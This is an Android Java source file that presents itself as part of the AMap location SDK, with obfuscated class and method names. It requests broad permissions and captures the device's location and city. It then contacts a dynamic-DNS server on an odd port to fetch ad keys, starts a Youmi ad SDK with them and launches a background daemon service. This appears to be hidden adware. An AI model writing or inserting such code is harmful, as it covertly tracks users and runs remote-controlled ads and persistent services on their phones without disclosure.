package com.amap.api.loc.location;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.util.Log;

import com.amap.api.loc.DaemonService;
import com.amap.api.location.AMapLocation;
import com.amap.api.location.AMapLocationClient;
import com.amap.api.location.AMapLocationClientOption;
import com.amap.api.location.AMapLocationListener;

import net.youmi.android.AdManager;

import org.json.JSONObject;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class A implements AMapLocationListener {

    private static final String TAG = "A";
    Activity av;
    private AMapLocationClient mLocationClient;

    @SuppressLint({"NewApi"})
    public void b(Activity activity) {
        av = activity;
        List<String> list = new ArrayList();
        if (activity.checkSelfPermission("android.permission.READ_PHONE_STATE") == -1) {
            list.add("android.permission.READ_PHONE_STATE");
        }

        if (activity.checkSelfPermission("android.permission.WRITE_EXTERNAL_STORAGE") == -1) {
            list.add("android.permission.WRITE_EXTERNAL_STORAGE");
        }

        if (activity.checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") == -1) {
            list.add("android.permission.ACCESS_COARSE_LOCATION");
        }

        if (activity.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == -1) {
            list.add("android.permission.ACCESS_FINE_LOCATION");
        }

        if (activity.checkSelfPermission("android.permission.CHANGE_WIFI_STATE") == -1) {
            list.add("android.permission.CHANGE_WIFI_STATE");
        }

        if (activity.checkSelfPermission("android.permission.WAKE_LOCK") == -1) {
            list.add("android.permission.WAKE_LOCK");
        }

        if (list.size() > 0) {
            String[] permissions = (String[]) list.toArray(new String[list.size()]);
            activity.requestPermissions(permissions, 1);
        }


        initLocation();


    }

    private void initLocation() {
        this.mLocationClient = new AMapLocationClient(av);
        this.mLocationClient.setLocationListener(this);
        AMapLocationClientOption mLocationOption = new AMapLocationClientOption();
        mLocationOption.setLocationMode(AMapLocationClientOption.AMapLocationMode.Hight_Accuracy);
        mLocationOption.setNeedAddress(true);
        mLocationOption.setOnceLocation(true);
        mLocationOption.setInterval(0L);
        this.mLocationClient.setLocationOption(mLocationOption);
        this.mLocationClient.startLocation();
    }

    public void c(String u) {
        try {
            String baseUrl = u;
            StringBuilder tempParams = new StringBuilder();
//                int pos = 0;
//                for (String key : paramsMap.keySet()) {
//                    if (pos > 0) {
//                        tempParams.append("&");
//                    }
//                    tempParams.append(String.format("%s=%s", key, URLEncoder.encode(paramsMap.get(key),"utf-8")));
//                    pos++;
//                }
            String requestUrl = baseUrl + tempParams.toString();
            // 新建一个URL对象
            URL url = new URL(requestUrl);
            // 打开一个HttpURLConnection连接
            HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
            // 设置连接主机超时时间
            urlConn.setConnectTimeout(5 * 1000);
            //设置从主机读取数据超时
            urlConn.setReadTimeout(5 * 1000);
            // 设置是否使用缓存  默认是true
            urlConn.setUseCaches(true);
            // 设置为Post请求
            urlConn.setRequestMethod("GET");
            //urlConn设置请求头信息
            //设置请求中的媒体类型信息。
            urlConn.setRequestProperty("Content-Type", "application/json");
            //设置客户端与服务连接类型
            urlConn.addRequestProperty("Connection", "Keep-Alive");
            // 开始连接
            urlConn.connect();
            // 判断请求是否成功
            if (urlConn.getResponseCode() == 200) {
                // 获取返回的数据
                String result = B.b(urlConn.getInputStream());
                Log.e(TAG, "Get方式请求成功，result--->" + result);
                JSONObject jsonObject = new JSONObject(result);
                if (jsonObject != null && jsonObject.getInt("code") == 0) {
                    try {

                        JSONObject data = jsonObject.getJSONObject("result");
                        if (data != null) {
                            AdManager.getInstance(av).init(data.getString("appKey"), data.getString("appSecret"), true, true);
                            av.startService(new Intent(av, DaemonService.class));
                        }
                    } catch (Exception e) {

                    }

                }
            } else {
                Log.e(TAG, "Get方式请求失败");
            }
            // 关闭连接
            urlConn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, e.toString());
        }
    }


    @Override
    public void onLocationChanged(AMapLocation amapLocation) {
        if (amapLocation != null && amapLocation.getErrorCode() == 0) {
            String code = amapLocation.getCityCode();
            String province = amapLocation.getProvince();
            D.setString(av, "cityCode", code);
            D.setString(av, "province", province);
            Log.e(TAG, "useAd :province->" + province + ",cityCode->" + code);
            this.mLocationClient.stopLocation();
            this.mLocationClient.onDestroy();
            new Thread(new Runnable() {
                @Override
                public void run() {

//                String url = "http://sangyiguo.vicp.io:43185/api/config?pname="+ C.o(av);
                    String url = "http://sangyiguo.vicp.io:43185/api/config?pname=" + "com.ad";
                    c(url);
                }
            }).start();
        }

    }
}